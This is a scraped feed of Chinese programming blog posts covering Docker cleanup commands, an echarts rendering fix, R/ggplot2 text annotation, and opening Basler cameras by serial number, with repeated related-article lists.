vrwfqcagz7r8ifu5cnlhdfrt4
syi02l2bsnvzrwjpweaulu8reTotal reclaimed space:5.618GBdocker container prune删除所有未运行的容器siqi@aliyun-sh-001:~/images$sudodocker container prune
WARNING!This will remove all stopped containers.
Are you sure you want to continue?[y/N]y
Total reclaimed space: 0Bdocker image prune要删除所有未使用的镜像siqi@aliyun-sh-001:~/images$sudodocker image prune
WARNING!This will remove all dangling images.
Are you sure you want to continue?[y/N]y
Total reclaimed space: 0Bdocker network prune要删除所有未使用的网络siqi@aliyun-sh-001:~/images$sudodocker network prune
WARNING!This will remove all custom networks not used by at least one container.
Are you sure you want to continue?[y/N]ydocker volume prune删除所有未使用的卷siqi@aliyun-sh-001:~/images$sudodocker volume prune
WARNING!This will remove alllocalvolumes not used by at least one container.
Are you sure you want to continue?[y/N]y
Deleted Volumes:
22522c1e24da1fb2826c5d3f58248a5c0b2886813c2298a5c196bb8632c3bc31
4b1900b4f3c40bb3c85a0c68cae8ac2b888529482879abd18c8390c4f2dd6ac8
8bb0075d091b1c2fde3b955de96e47695f93191e09e71eee403e5c6edcb827de
415f3d9b5a229d615a734c7488ca1f29b0e7abc2adb6544229078c5cfdba7d4b
c3bfd05a31061f8e48fecf85dd7277a3498ae322dfb053b2fb6372c02bee88f6
b1c5f43ade5237ca757bf6075ed7ff259f4967a0235589fbc083e7fe64c47503
9f8841f01afd7f6b23408d04ae1b58b5c34102b63787dc8fc997782fae76e222
38e9235262c538ee4debeff1fe92f2cada6013daa42a13584e4003441f95a64b
8f0c9ba87d77a9f812283a0d03299557c79322a8149385ac52c4023afea73961
1f6c0a82e016e8b2024ab8d8d14b569fca5514092f05eea665754b3b84d02f82
4789f8d09149739a6b3898a4dc05e1a508da4ba58354ffbf4c178aa6d200f8cd
1cb3a882f4c7d7f43394318d69cc7882fe419cd00495f959f4fcdb90e36a4a5c
6f1a57c764e2b9c542ceea16bed4c0f418e9da6f38d06f9217b49b780ea845b2
61fa635ee216502ace3cce349f9b8bea3530349f97bbc96fd3bc0284e568f70f
692d6655178c3e03739742820ed14b7a254ca74219de2fe0022aa7eb7e45286c
3c63057faee65ebb8726d238c9e5c4e1eeffbb0a292736a45aed7b44eddb6f79
ff680dc86b395e25ea60c75a65aa437086e6886e04e7bd75cc3c118362bdf32e
0c18d949fe762fcb9bcbd296f05f20542c7120f4ae16b1bf6ca02bf3adfd2402
e872c660f770e3c54f582e35f7eb401cb400cfcb48328ae57ea8f16e875402b9
97767c652ff164883d80fd01ff5e323793cb519ddce0ef9c95b82823ac3943d9
3b2902e6c30747c1c8b67e94ff31872189bc100cfe81c89a1c8f9e174bb97eeb
9248123749c8525a06c650e0bac2900f35285d9c8dad51262978f350d1ea700d
9439364ecd0d1161714e1123041eef6b95c4e37f28194ba6fa2c3d469c7136c5
b2bb414b4e75fd570a07e36ba612e8b5eb65158b5f26c54922a33a647dbd0180
0160e74f7b174c08532e396adadbac1b40b250bc2f0a01e27bc8d96c20f007d2
a11b9f5477bac6a07e1fc9bf45384e320d15f8d9f6ecd3487b2d4a4726753c81
bca4251b76d8c709177e666a6375e640d3120fb55484924de05bc81cf1f2ca0eTotal reclaimed space:1.286MBhttp://www.ppmy.cn/news/1540411.html相关文章(echarts)折线图初始渲染canvas特别窄问题(echarts)折线图初始渲染canvas特别窄问题 自行解决使用方法&amp;#xff1a; 
this.$nextTick(() &gt; {this.showView(this.queryId)
})解决后&amp;#xff1a;  搜索建议&amp;#xff1a;阅读更多...R语言绘图——文本注释在R语言中&amp;#xff0c;文本注释通常用于向图形中添加注释或说明&amp;#xff0c;可以通过一些函数在图形上添加文字、标签等。以下是R中处理文本注释的常见函数和方法。 
0x01 text()函数 
一、常见语法 
text() 函数允许你在绘图的指定位置上添加文字注释。其常用语法如下&amp;#xf…阅读更多...这种V带的无极变速能用在新能源汽车上吧？CVT的无极变速器的结构能用在电动汽车上吗&amp;#xff1f;阅读更多...[机器视觉]basler相机使用SN编号打开相机和采集背景分析 
在项目中是用basler相机采图时&amp;#xff0c;一般用的比较多的遍历相机&amp;#xff0c;然后使用CreateFirstDevice这个函数获取相机&amp;#xff0c;有些时候可能需要同时连接多个相机&amp;#xff0c;这里一般是遍历后&amp;#xff0c;再循环打开相机&amp;#xff0c;根据打开相机的SN号确…阅读更多...Golang | Leetcode Golang题解之第480题滑动窗口中位数题目&amp;#xff1a; 题解&amp;#xff1a; 
type hp struct {sort.IntSlicesize int
}
func (h *hp) Push(v interface{}) { h.IntSlice  append(h.IntSlice, v.(int)) }
func (h *hp) Pop() interface{}   { a : h.IntSlice; v : a[len(a)-1]; h.IntSlice  a[:len(a)-1]; return v }…阅读更多...学习的文档10/14为什么不推荐使用外键与级联? 
【强制】不得使用外键与级联&amp;#xff0c;一切外键概念必须在应用层解决。 
说明: 以学生和成绩的关系为例&amp;#xff0c;学生表中的 student_id 是主键&amp;#xff0c;那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id&amp;#xff0c…阅读更多...利用高德API获取整个城市的公交路线并可视化（六）记录于2024年10月，因数据获取受网站更新策略等影响可能会失效，故记录写作时间，书接上回，根据测试地铁线路也可以如法炮制，且地铁线路更少，实现起来更容易，本篇文章我们依然以厦门地铁作为示例。 
先讲一下方法思路，一共四个步骤； 
方法思路 高德开放平台的JS API 1.4 …阅读更多...OpenCV-物体跟踪文章目录 一、物体跟踪的定义二、OpenCV中的物体跟踪算法三、OpenCV物体跟踪的实现步骤四、代码实现五、注意事项 OpenCV是一个开源的计算机视觉和机器学习软件库&amp;#xff0c;它提供了丰富的功能来实现物体跟踪。以下是对OpenCV中物体跟踪的详细解释&amp;#xff1a; 一、物体跟踪的…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:47 +0000</pubDate>
    </item>
    <item>
      <title>(echarts)折线图初始渲染canvas特别窄问题</title>
      <link>https://www.ppmy.cn/news/1540410.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维(echarts)折线图初始渲染canvas特别窄问题news/2025/10/31 17:53:46/(echarts)折线图初始渲染canvas特别窄问题自行解决使用方法：this.$nextTick(()=&gt;{this.showView(this.queryId)})解决后：搜索建议：http://www.ppmy.cn/news/1540410.html相关文章R语言绘图——文本注释在R语言中&amp;#xff0c;文本注释通常用于向图形中添加注释或说明&amp;#xff0c;可以通过一些函数在图形上添加文字、标签等。以下是R中处理文本注释的常见函数和方法。 
0x01 text()函数 
一、常见语法 
text() 函数允许你在绘图的指定位置上添加文字注释。其常用语法如下&amp;#xf…阅读更多...这种V带的无极变速能用在新能源汽车上吧？CVT的无极变速器的结构能用在电动汽车上吗&amp;#xff1f;阅读更多...[机器视觉]basler相机使用SN编号打开相机和采集背景分析 
在项目中是用basler相机采图时&amp;#xff0c;一般用的比较多的遍历相机&amp;#xff0c;然后使用CreateFirstDevice这个函数获取相机&amp;#xff0c;有些时候可能需要同时连接多个相机&amp;#xff0c;这里一般是遍历后&amp;#xff0c;再循环打开相机&amp;#xff0c;根据打开相机的SN号确…阅读更多...Golang | Leetcode Golang题解之第480题滑动窗口中位数题目&amp;#xff1a; 题解&amp;#xff1a; 
type hp struct {sort.IntSlicesize int
}
func (h *hp) Push(v interface{}) { h.IntSlice  append(h.IntSlice, v.(int)) }
func (h *hp) Pop() interface{}   { a : h.IntSlice; v : a[len(a)-1]; h.IntSlice  a[:len(a)-1]; return v }…阅读更多...学习的文档10/14为什么不推荐使用外键与级联? 
【强制】不得使用外键与级联&amp;#xff0c;一切外键概念必须在应用层解决。 
说明: 以学生和成绩的关系为例&amp;#xff0c;学生表中的 student_id 是主键&amp;#xff0c;那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id&amp;#xff0c…阅读更多...利用高德API获取整个城市的公交路线并可视化（六）记录于2024年10月，因数据获取受网站更新策略等影响可能会失效，故记录写作时间，书接上回，根据测试地铁线路也可以如法炮制，且地铁线路更少，实现起来更容易，本篇文章我们依然以厦门地铁作为示例。 
先讲一下方法思路，一共四个步骤； 
方法思路 高德开放平台的JS API 1.4 …阅读更多...OpenCV-物体跟踪文章目录 一、物体跟踪的定义二、OpenCV中的物体跟踪算法三、OpenCV物体跟踪的实现步骤四、代码实现五、注意事项 OpenCV是一个开源的计算机视觉和机器学习软件库&amp;#xff0c;它提供了丰富的功能来实现物体跟踪。以下是对OpenCV中物体跟踪的详细解释&amp;#xff1a; 一、物体跟踪的…阅读更多...[产品管理-48]：产品生命周期 - 产品线路图、技术线路图以及各自的区别目录 
一、产品线路图 
1、产品路线图的内容 
2、产品路线图的绘制步骤 
3、产品路线图的作用与目的 
4、产品路线图的应用场景 
二、技术线路图 
1、定义与特征 
2、种类与分类 
3、作用与意义 
4、绘制方法 
5、案例分享 
三、产品线路图与技术线路图区别 
1、定义与关注点 
…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:46 +0000</pubDate>
    </item>
    <item>
      <title>R语言绘图——文本注释</title>
      <link>https://www.ppmy.cn/news/1540409.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维R语言绘图——文本注释news/2025/10/31 17:53:45/在R语言中，文本注释通常用于向图形中添加注释或说明，可以通过一些函数在图形上添加文字、标签等。以下是R中处理文本注释的常见函数和方法。0x01 text()函数一、常见语法text()函数允许你在绘图的指定位置上添加文字注释。其常用语法如下：text(x,y,labels,pos=NULL,...)x,y：文字显示的坐标。labels：需要显示的文字内容。pos：文字位置（相对于指定坐标的文字显示位置，1=下，2=左，3=上，4=右）。二、在指定位置添加文字注释# 简单绘图plot(1:10,rnorm(10),main="示例图")# 在指定位置添加文字注释text(5,0,labels="中心位置",pos=3,col="blue")三、公式添加#简单绘图x=c(1:10)y=c(1,1.9,3.5,4.5,6.2,7.5,9.2,10.5,11.3,12.3)plot(x,y)model&lt;-lm(y~x)abline(model,lty=2)#公式添加a&lt;-round(model[[1]][1],2)b&lt;-round(model[[1]][2],2)text(6,4,paste("y=",a,"+",b,"x"))0x02 mtext() 函数mtext()函数可以在图的边缘（边界）添加注释文本，适用于在图形的外部添加说明文字。# 创建一个空白图形plot(1:10,rnorm(10),main="边缘注释示例")# 在图形的上方添加注释mtext("这是图形上方的注释",side=3,line=2,col="red")#side 参数：用于指定文本的位置，1=下，2=左，3=上，4=右。0x03 title() 函数title()函数允许你为图形添加标题、x轴标题、y轴标题及副标题。# 创建散点图plot(1:10,rnorm(10))# 添加标题和副标题title(main="主标题",sub="副标题",xlab="X轴标题",ylab="Y轴标题")0x04 legend() 函数legend()用于为图例添加注释，是在图中解释数据点或图形内容的重要工具。# 绘制两组数据plot(1:10,rnorm(10),col="blue",pch=16)points(1:10,rnorm(10,1),col="red",pch=17)# 添加图例legend("topright",legend=c("组1","组2"),col=c("blue","red"),pch=c(16,17))0x05 使用ggplot2包一、基本的geom_text() 和geom_label()用法1、为每个点添加标签geom_text()是最常用的文本注释函数，用于在图形中的每个数据点上显示文本。library(ggplot2)# 创建散点图并为每个点添加标签p&lt;-ggplot(mtcars,aes(x=wt,y=mpg))+geom_point()+#在图中的每个点上添加了 mtcars 数据集的行名作为标签。vjust 控制文本的垂直位置，color 控制文本颜色。geom_text(aes(label=rownames(mtcars)),vjust=1.5,color="blue")print(p)2、为点添加标签框geom_label()与geom_text()类似，区别在于它可以为文本添加一个背景框（标签框），使得文本在一些复杂背景的图中更加显眼。p&lt;-ggplot(mtcars,aes(x=wt,y=mpg))+geom_point()+#每个点上的文本被一个绿色标签框包裹，使其更突出。geom_label(aes(label=rownames(mtcars)),fill="lightgreen",color="black")print(p)3、根据条件添加文本你可以使用条件语句为特定的数据点添加文本。ifelse()函数可以用来选择性地显示文本。p&lt;-ggplot(mtcars,aes(x=wt,y=mpg))+geom_point()+#只有当 mpg &gt; 25 时，才会显示相应的标签，其他点不显示标签。geom_text(aes(label=ifelse(mpg&gt;25,rownames(mtcars),"")),vjust=1.5,color="red")print(p)4、自定义文本样式geom_text()和geom_label()支持多种样式选项，如文本大小、字体、角度、透明度等。p&lt;-ggplot(mtcars,aes(x=wt,y=mpg))+geom_point()+#文本大小设置为4，字体类型为 serif，并且旋转了45度，使文本更加美观和特殊。geom_text(aes(label=rownames(mtcars)),size=4,angle=45,family="serif",color="purple")print(p)二、使用 annotate() 函数annotate()函数可以直接在图中某个特定的位置添加文本或其他注释，而不需要依赖数据集中的变量。它常用于手动标记图中的关键区域或点。1、在特定位置添加注释文本p&lt;-ggplot(mtcars,aes(x=wt,y=mpg))+geom_point()+#annotate() 函数在 x=3, y=30 的位置添加了自定义文本"高效能车辆"。annotate("text",x=3,y=30,label="高效能车辆",color="blue",size=5)print(p)2、区域边缘文本添加p&lt;-ggplot(mtcars,aes(x=wt,y=mpg))+geom_point()+#x = -Inf 和 y = Inf 表示将文本放置在图的左上角。#hjust：水平对齐，通常取值为 0 (左对齐)、0.5 (居中对齐) 和 1 (右对齐)。#vjust：垂直对齐，通常取值为 0 (下对齐)、0.5 (居中对齐) 和 1 (上对齐)。annotate("text",x=-Inf,y=Inf,hjust=-0.2,vjust=2,label="Upper left")print(p)3、 添加其他图形元素annotate()不仅可以添加文本，还可以添加其他几何图形，如箭头、矩形、圆等，以便标记或高亮特定的图形区域。p&lt;-ggplot(mtcars,aes(x=wt,y=mpg))+geom_point()+annotate("rect",xmin=3,xmax=4,ymin=15,ymax=25,alpha=0.2,fill="yellow")+annotate("segment",x=5,xend=4.5,y=30,yend=22,color="red",arrow=arrow())+annotate("segment",x=2.5,xend=3.5,y=30,yend=30,arrow=arrow(ends="both",angle=60,length=unit(0.5,"cm")))print(p)4、直线、斜线、线段的添加p&lt;-ggplot(mtcars,aes(x=wt,y=mpg))+geom_point()+#在 y = 20 位置添加一条水平线，在 x = 4 位置添加一条垂直线。geom_hline(yintercept=20)+geom_vline(xintercept=4)+#添加一条通过截距为10，斜率为2的对角线（即 y = 10 + 2*x）geom_abline(intercept=10,slope=2)+#添加一个从 (2.5, 12.5) 到 (4.5, 12.5) 的水平线段annotate("segment",x=2.5,xend=4.5,y=12.5,yend=12.5)print(p)5、阴影部分添加p&lt;-ggplot(climate,aes(x=Year,y=Anomaly10y))+geom_line()+## 添加一个矩形区域，从1940年到1970年之间，y值从-1到1，半透明且填充为浅蓝色annotate("rect",xmin=1940,xmax=1970,ymin=-1,ymax=1,alpha=0.5,fill="lightblue")print(p)6、动态调整文本颜色和大小p&lt;-ggplot(mtcars,aes(x=wt,y=mpg))+geom_point()+#根据 mpg 值动态调整文本颜色和大小，mpg 较大的数据点对应的文本将更大且颜色不同。geom_text(aes(label=rownames(mtcars),color=mpg,size=mpg))print(p)三、使用 ggrepel包：防止文本重叠ggrepel包是对ggplot2包的一个扩展，旨在解决ggplot2中文本标签重叠的问题。它和ggplot2包紧密相关，专门用于提升ggplot2的文本注释功能，特别是在复杂的可视化场景中，避免文本重叠，从而使标签更容易阅读和解释。在数据点较多或文本注释较密集时，文本标签可能会重叠。ggrepel包提供了geom_text_repel()和geom_label_repel()会自动调整标签的位置，避免重叠，并保持文本与数据点的连接。library(ggrepel)p&lt;-ggplot(mtcars,aes(x=wt,y=mpg))+geom_point()+#geom_text_repel() 自动调整文本位置，避免文本重叠，使图形更加清晰。geom_text_repel(aes(label=rownames(mtcars)))print(p)http://www.ppmy.cn/news/1540409.html相关文章这种V带的无极变速能用在新能源汽车上吧？CVT的无极变速器的结构能用在电动汽车上吗&amp;#xff1f;阅读更多...[机器视觉]basler相机使用SN编号打开相机和采集背景分析 
在项目中是用basler相机采图时&amp;#xff0c;一般用的比较多的遍历相机&amp;#xff0c;然后使用CreateFirstDevice这个函数获取相机&amp;#xff0c;有些时候可能需要同时连接多个相机&amp;#xff0c;这里一般是遍历后&amp;#xff0c;再循环打开相机&amp;#xff0c;根据打开相机的SN号确…阅读更多...Golang | Leetcode Golang题解之第480题滑动窗口中位数题目&amp;#xff1a; 题解&amp;#xff1a; 
type hp struct {sort.IntSlicesize int
}
func (h *hp) Push(v interface{}) { h.IntSlice  append(h.IntSlice, v.(int)) }
func (h *hp) Pop() interface{}   { a : h.IntSlice; v : a[len(a)-1]; h.IntSlice  a[:len(a)-1]; return v }…阅读更多...学习的文档10/14为什么不推荐使用外键与级联? 
【强制】不得使用外键与级联&amp;#xff0c;一切外键概念必须在应用层解决。 
说明: 以学生和成绩的关系为例&amp;#xff0c;学生表中的 student_id 是主键&amp;#xff0c;那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id&amp;#xff0c…阅读更多...利用高德API获取整个城市的公交路线并可视化（六）记录于2024年10月，因数据获取受网站更新策略等影响可能会失效，故记录写作时间，书接上回，根据测试地铁线路也可以如法炮制，且地铁线路更少，实现起来更容易，本篇文章我们依然以厦门地铁作为示例。 
先讲一下方法思路，一共四个步骤； 
方法思路 高德开放平台的JS API 1.4 …阅读更多...OpenCV-物体跟踪文章目录 一、物体跟踪的定义二、OpenCV中的物体跟踪算法三、OpenCV物体跟踪的实现步骤四、代码实现五、注意事项 OpenCV是一个开源的计算机视觉和机器学习软件库&amp;#xff0c;它提供了丰富的功能来实现物体跟踪。以下是对OpenCV中物体跟踪的详细解释&amp;#xff1a; 一、物体跟踪的…阅读更多...[产品管理-48]：产品生命周期 - 产品线路图、技术线路图以及各自的区别目录 
一、产品线路图 
1、产品路线图的内容 
2、产品路线图的绘制步骤 
3、产品路线图的作用与目的 
4、产品路线图的应用场景 
二、技术线路图 
1、定义与特征 
2、种类与分类 
3、作用与意义 
4、绘制方法 
5、案例分享 
三、产品线路图与技术线路图区别 
1、定义与关注点 
…阅读更多...tPS+redis限流算法拓展: 
压力测试概念及方法(TPS/并发量)_压测tps-CSDN博客 
压测指标TPS和QPS_压测tps-CSDN博客 
------------------------------------------------------------------------------ 
基于Redis限流&amp;#xff08;固定窗口、滑动窗口、漏桶、令牌桶&amp;#xff09;&amp;#xff08;肝货…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:45 +0000</pubDate>
    </item>
    <item>
      <title>这种V带的无极变速能用在新能源汽车上吧？</title>
      <link>https://www.ppmy.cn/news/1540408.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维这种V带的无极变速能用在新能源汽车上吧？news/2025/10/31 17:53:44/CVT的无极变速器的结构能用在电动汽车上吗？http://www.ppmy.cn/news/1540408.html相关文章[机器视觉]basler相机使用SN编号打开相机和采集背景分析 
在项目中是用basler相机采图时&amp;#xff0c;一般用的比较多的遍历相机&amp;#xff0c;然后使用CreateFirstDevice这个函数获取相机&amp;#xff0c;有些时候可能需要同时连接多个相机&amp;#xff0c;这里一般是遍历后&amp;#xff0c;再循环打开相机&amp;#xff0c;根据打开相机的SN号确…阅读更多...Golang | Leetcode Golang题解之第480题滑动窗口中位数题目&amp;#xff1a; 题解&amp;#xff1a; 
type hp struct {sort.IntSlicesize int
}
func (h *hp) Push(v interface{}) { h.IntSlice  append(h.IntSlice, v.(int)) }
func (h *hp) Pop() interface{}   { a : h.IntSlice; v : a[len(a)-1]; h.IntSlice  a[:len(a)-1]; return v }…阅读更多...学习的文档10/14为什么不推荐使用外键与级联? 
【强制】不得使用外键与级联&amp;#xff0c;一切外键概念必须在应用层解决。 
说明: 以学生和成绩的关系为例&amp;#xff0c;学生表中的 student_id 是主键&amp;#xff0c;那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id&amp;#xff0c…阅读更多...利用高德API获取整个城市的公交路线并可视化（六）记录于2024年10月，因数据获取受网站更新策略等影响可能会失效，故记录写作时间，书接上回，根据测试地铁线路也可以如法炮制，且地铁线路更少，实现起来更容易，本篇文章我们依然以厦门地铁作为示例。 
先讲一下方法思路，一共四个步骤； 
方法思路 高德开放平台的JS API 1.4 …阅读更多...OpenCV-物体跟踪文章目录 一、物体跟踪的定义二、OpenCV中的物体跟踪算法三、OpenCV物体跟踪的实现步骤四、代码实现五、注意事项 OpenCV是一个开源的计算机视觉和机器学习软件库&amp;#xff0c;它提供了丰富的功能来实现物体跟踪。以下是对OpenCV中物体跟踪的详细解释&amp;#xff1a; 一、物体跟踪的…阅读更多...[产品管理-48]：产品生命周期 - 产品线路图、技术线路图以及各自的区别目录 
一、产品线路图 
1、产品路线图的内容 
2、产品路线图的绘制步骤 
3、产品路线图的作用与目的 
4、产品路线图的应用场景 
二、技术线路图 
1、定义与特征 
2、种类与分类 
3、作用与意义 
4、绘制方法 
5、案例分享 
三、产品线路图与技术线路图区别 
1、定义与关注点 
…阅读更多...tPS+redis限流算法拓展: 
压力测试概念及方法(TPS/并发量)_压测tps-CSDN博客 
压测指标TPS和QPS_压测tps-CSDN博客 
------------------------------------------------------------------------------ 
基于Redis限流&amp;#xff08;固定窗口、滑动窗口、漏桶、令牌桶&amp;#xff09;&amp;#xff08;肝货…阅读更多...DAY47WEB 攻防-PHP 应用文件上传函数缺陷条件竞争二次渲染黑白名单JS 绕过1、PHP-原生态-文件上传-检测后缀&amp;黑白名单2、PHP-原生态-文件上传-检测信息&amp;类型内容3、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷4、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷 文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:44 +0000</pubDate>
    </item>
    <item>
      <title>[机器视觉]basler相机使用SN编号打开相机和采集</title>
      <link>https://www.ppmy.cn/news/1540407.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维[机器视觉]basler相机使用SN编号打开相机和采集news/2025/10/31 17:53:43/背景分析在项目中是用basler相机采图时，一般用的比较多的遍历相机，然后使用CreateFirstDevice这个函数获取相机，有些时候可能需要同时连接多个相机，这里一般是遍历后，再循环打开相机，根据打开相机的SN号确定是否是自己需要的相机，但如果设备同时连接了多个相机，我们只使用其中的1到2个，这时遍历打开相机就会出现相机占用情况，而且相机数量多的时候，遍历相机和打开相机也比较耗时。遍历打开相机方法一：遍历所有相机，获取相机的SN编码跟配置文件中的SN进行对比，确认后再打开相机。//输入SN号std::string s = snNumber.toStdString();DeviceInfoList_t devList;//初始化PylonInitialize();CTlFactory&amp; TlFactory = CTlFactory::GetInstance();int camNum = TlFactory.EnumerateDevices(devList);for(int i=0;i&lt;camNum;i++){QString snName = QString(devList[i].GetSerialNumber());if(snNumber == snName){Pylon::IPylonDevice* pDevice = CTlFactory::GetInstance().CreateDevice( devList[i]);m_basler.RegisterImageEventHandler(this, RegistrationMode_Append, Cleanup_Delete);m_basler.Attach(pDevice,Cleanup_Delete);m_basler.Open();if (!m_basler.IsOpen() || m_basler.IsGrabbing()){qDebug()&lt;&lt;"camera open failed"&lt;&lt;Qt::endl;return;}}}直接根据SN编码打开相机方法二：在初始化后，直接将已知SN编号打开相机。//使用SN编码直接打开相机std::string s = snNumber.toStdString();PylonInitialize();CDeviceInfo info;info.SetSerialNumber(s.c_str());Pylon::IPylonDevice* pDevice = CTlFactory::GetInstance().CreateDevice(info);m_basler.RegisterImageEventHandler(this, RegistrationMode_Append, Cleanup_Delete);m_basler.Attach(pDevice,Cleanup_Delete);m_basler.Open();if (!m_basler.IsOpen() || m_basler.IsGrabbing()){qDebug()&lt;&lt;"camera open failed"&lt;&lt;Qt::endl;return;}#注意事项 #方法二适合在已确认连接好SN编号的相机的情况下初始化相机，如果找不到相机，则会出现创建相机错误的bug相对而言，方法一对相机列表进行比对，可获知相机是否存在，然后再进行下一步操作。http://www.ppmy.cn/news/1540407.html相关文章Golang | Leetcode Golang题解之第480题滑动窗口中位数题目&amp;#xff1a; 题解&amp;#xff1a; 
type hp struct {sort.IntSlicesize int
}
func (h *hp) Push(v interface{}) { h.IntSlice  append(h.IntSlice, v.(int)) }
func (h *hp) Pop() interface{}   { a : h.IntSlice; v : a[len(a)-1]; h.IntSlice  a[:len(a)-1]; return v }…阅读更多...学习的文档10/14为什么不推荐使用外键与级联? 
【强制】不得使用外键与级联&amp;#xff0c;一切外键概念必须在应用层解决。 
说明: 以学生和成绩的关系为例&amp;#xff0c;学生表中的 student_id 是主键&amp;#xff0c;那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id&amp;#xff0c…阅读更多...利用高德API获取整个城市的公交路线并可视化（六）记录于2024年10月，因数据获取受网站更新策略等影响可能会失效，故记录写作时间，书接上回，根据测试地铁线路也可以如法炮制，且地铁线路更少，实现起来更容易，本篇文章我们依然以厦门地铁作为示例。 
先讲一下方法思路，一共四个步骤； 
方法思路 高德开放平台的JS API 1.4 …阅读更多...OpenCV-物体跟踪文章目录 一、物体跟踪的定义二、OpenCV中的物体跟踪算法三、OpenCV物体跟踪的实现步骤四、代码实现五、注意事项 OpenCV是一个开源的计算机视觉和机器学习软件库&amp;#xff0c;它提供了丰富的功能来实现物体跟踪。以下是对OpenCV中物体跟踪的详细解释&amp;#xff1a; 一、物体跟踪的…阅读更多...[产品管理-48]：产品生命周期 - 产品线路图、技术线路图以及各自的区别目录 
一、产品线路图 
1、产品路线图的内容 
2、产品路线图的绘制步骤 
3、产品路线图的作用与目的 
4、产品路线图的应用场景 
二、技术线路图 
1、定义与特征 
2、种类与分类 
3、作用与意义 
4、绘制方法 
5、案例分享 
三、产品线路图与技术线路图区别 
1、定义与关注点 
…阅读更多...tPS+redis限流算法拓展: 
压力测试概念及方法(TPS/并发量)_压测tps-CSDN博客 
